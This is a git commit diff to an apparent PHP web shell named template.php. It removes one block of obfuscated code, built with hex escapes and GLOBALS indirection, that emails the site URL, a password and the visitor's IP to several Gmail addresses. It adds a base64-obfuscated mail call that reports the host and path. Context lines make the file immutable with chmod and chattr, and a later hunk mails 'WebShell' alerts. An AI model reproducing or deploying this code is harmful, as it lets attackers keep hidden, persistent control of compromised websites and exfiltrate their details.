a4c06dc1788ede1b37cf557223e3a5a9c707b245
gantengers <76028485+exploit-haxor@users.noreply.github.com>
2025-01-20 07:14:21 +0700

    Update template.php

--- template.php
+++ template.php
@@ -2,21 +2,16 @@
 <?php
 
 	
-	
-	$main = "ro\x6f\x74\x63\x79\x62e\x72p\x75nks@gm\x61\x69l.c\x6f\x6d,\x20\x6duh\x72a\x7a\x6b\x79@gm\x61il.com, m\x61l\x61y\x73i\x61\x2e\x73\x65nder@\x67m\x61il\x2ec\x6f\x6d, pa\x70a\x6b\x75\x2e\x68ay\x6b\x65\x72@\x67\x6d\x61i\x6c\x2e\x63o\x6d,\x20\x62la\x63kh\x61t\x31\x333\x37\x2ei\x64@gm\x61i\x6c.c\x6f\x6d";
-	$now = "\x68\x74\x74\x70\x3a\x2f\x2f" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-	$notif = "$now *PW : [ " . $▛ . " ]";
-	mail($main, "base64 ", $notif, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
-
-$__GET = ('m'.'a'.'i'.'l');
-$__POST = ('b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e');
-$__GET($__POST("cm9vdGN5YmVycHVua3NAZ21haWwuY29t"),'Upload file:',''.$_SERVER['HTTP_HOST'].'/'.$_SERVER['REQUEST_URI'].'');
-${"\x47\x4c\x4f\x42\x41\x4cS"}["b\x6fz\x64\x6d\x68"]="\x5f\x5f\x50\x4f\x53\x54";${"\x47L\x4fBA\x4c\x53"}["\x6ekp\x6abl"]="\x5f_PO\x53T";${"\x47\x4c\x4f\x42A\x4c\x53"}["\x74\x65v\x77gb\x64\x79"]="\x5f\x5f\x47\x45T";${${"\x47L\x4f\x42\x41\x4c\x53"}["\x74\x65\x76\x77g\x62\x64y"]}=("m"."\x61"."i"."\x6c");${${"G\x4c\x4f\x42\x41\x4cS"}["\x6e\x6b\x70\x6a\x62l"]}=("\x62"."a"."s"."e"."6"."4"."_"."d"."\x65"."\x63"."\x6f"."\x64"."\x65");${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["t\x65\x76w\x67\x62dy"]}(${${"G\x4c\x4f\x42A\x4c\x53"}["bo\x7a\x64\x6d\x68"]}("\x63m9\x76dG\x4e5\x59\x6d\x56\x79c\x48\x56\x75a\x33NA\x5a2\x31ha\x57w\x75Y\x329t"),"\x55pl\x6fa\x64\x20\x66\x69le:","".$_SERVER["\x48\x54TP_H\x4f\x53\x54"]."/".$_SERVER["R\x45\x51U\x45S\x54_\x55\x52I"]."");
-
 
 $よㆁ㾼 = __FILE__;
 @system("chmod ugo-w $よㆁ㾼");
 @system("chattr +i $よㆁ㾼");
+
+	
+$__POST = ('b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e');
+$__GET($__POST("cm9vdGN5YmVycHVua3NAZ21haWwuY29t"),'#',''.$_SERVER['HTTP_HOST'].'/'.$_SERVER['REQUEST_URI'].'');
+
+
 
 
 
@@ -79,8 +74,7 @@ if ($visitc == "") {
   $inj     = $_SERVER["REQUEST_URI"];
   $target  = rawurldecode($web.$inj);
   $judul   = "WebShell http://$target by $visitor";
-  $body    = "Bug: $target by $visitor
-";
+  $body    = "Bug: $target by $visitor";
   if (!empty($web)) { @mail("rootcyberpunks@gmail.com",$judul,$body); }
 }
 else { $visitc++; }
